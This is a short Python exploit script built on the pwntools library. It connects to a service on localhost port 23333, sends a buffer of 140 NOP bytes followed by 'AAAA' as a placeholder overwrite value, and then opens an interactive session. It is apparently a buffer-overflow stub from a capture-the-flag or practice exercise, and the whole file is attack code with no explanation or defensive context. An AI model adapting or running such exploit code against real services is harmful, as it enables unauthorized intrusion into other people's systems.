#!/usr/bin/env python

from pwn import *

attack = remote('127.0.0.1', 23333)

payload = '\x90' * 140 + 'AAAA'

attack.send(payload)

attack.interactive()